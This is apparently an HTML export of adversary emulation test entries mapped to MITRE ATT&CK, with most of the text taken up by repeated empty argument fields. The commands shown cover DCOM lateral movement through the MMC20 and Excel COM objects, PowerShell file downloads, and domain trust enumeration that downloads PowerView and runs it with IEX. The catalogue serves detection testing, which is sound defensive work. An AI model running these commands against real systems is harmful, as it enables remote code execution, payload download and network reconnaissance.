<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 6dc74eb1-c9d6-4c53-b3b5-6f50ae339673</li>
<li><strong>name</strong>: PowerShell Lateral Movement using MMC20</li>
<li><strong>description</strong>: Powershell lateral movement using the mmc20 application com object.</li>
</ul>
<p>Reference:</p>
<p>https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/</p>
<p>Upon successful execution, cmd will spawn calc.exe on a remote computer.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1021.003</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 505f24be-1c11-4694-b614-e01ae1cd2570</li>
<li><strong>name</strong>: PowerShell Lateral Movement Using Excel Application Object</li>
<li><strong>description</strong>: Powershell lateral movement using the Excel COM objects.</li>
</ul>
<p>Reference:</p>
<p>https://posts.specterops.io/lateral-movement-abuse-the-power-of-dcom-excel-application-3c016d0d9922</p>
<p>Upon successful execution, cmd will spawn calc.exe on a remote computer.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: copy c:\windows\system32\calc.exe 'C:\users#{user}\AppData\local\Microsoft\WindowsApps\foxprow.exe'
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","#{computer_name}"))
$com.ActivateMicrosoftApp("5")</p>
</li>
<li>
<p><strong>prereq_command</strong>: try {
  New-Object -COMObject "Excel.Application" | Out-Null
  Stop-Process -Name "Excel"
  exit 0
} catch { exit 1 }</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Write-Host "You will need to install Microsoft Excel manually to meet this requirement"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: Remove-Item 'C:\users#{user}\AppData\local\Microsoft\WindowsApps\foxprow.exe'</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1021.003</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 42dc4460-9aa6-45d3-b1a6-3955d34e1fe8</li>
<li><strong>name</strong>: Windows - PowerShell Download</li>
<li>
<p><strong>description</strong>: This test uses PowerShell to download a payload.
This technique is used by multiple adversaries and malware families.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: (New-Object System.Net.WebClient).DownloadFile("#{remote_file}", "#{destination_path}")</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-Item #{destination_path} -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1105</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 54a4daf1-71df-4383-9ba7-f1a295d8b6d2</li>
<li><strong>name</strong>: File Download via PowerShell</li>
<li>
<p><strong>description</strong>: Use PowerShell to download and write an arbitrary file from the internet. Example is from the 2021 Threat Detection Report by Red Canary.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: (New-Object Net.WebClient).DownloadString('#{target_remote_file}') | Out-File #{output_file}; Invoke-Item #{output_file}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1105</li>
<li><strong>input_arguments.output_file</strong>: {'description': 'File to write to', 'type': 'string', 'default': 'LICENSE.txt'}</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: c01cad7f-7a4c-49df-985e-b190dcf6a279</li>
<li><strong>name</strong>: iwr or Invoke Web-Request download</li>
<li>
<p><strong>description</strong>: Use 'iwr' or "Invoke-WebRequest" -URI argument to download a file from the web. Note: without -URI also works in some versions.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: powershell.exe iwr -URI #{remote_file} -Outfile #{local_path}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: del %temp%\Atomic-license.txt &gt;nul 2&gt;&amp;1</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1105</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: c58fbc62-8a62-489e-8f2d-3565d7d96f30</li>
<li><strong>name</strong>: Powershell enumerate domains and forests</li>
<li>
<p><strong>description</strong>: Use powershell to enumerate AD information.
Requires the installation of PowerShell AD admin cmdlets via Windows RSAT or the Windows Server AD DS role.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Import-Module "PathToAtomicsFolder..\ExternalPayloads\PowerView.ps1"
Get-NetDomainTrust
Get-NetForestTrust
Get-ADDomain
Get-ADGroupMember Administrators -Recursive
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "PathToAtomicsFolder..\ExternalPayloads\PowerView.ps1") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory "PathToAtomicsFolder..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1" -OutFile "PathToAtomicsFolder..\ExternalPayloads\PowerView.ps1"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1482</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: f974894c-5991-4b19-aaf5-7cc2fe298c5d</li>
<li><strong>name</strong>: Get-DomainTrust with PowerView</li>
<li>
<p><strong>description</strong>: Utilizing PowerView, run Get-DomainTrust to identify domain trusts. Upon execution, progress and info about trusts within the domain being scanned will be displayed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1482</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 58ed10e8-0738-4651-8408-3a3e9a526279</li>
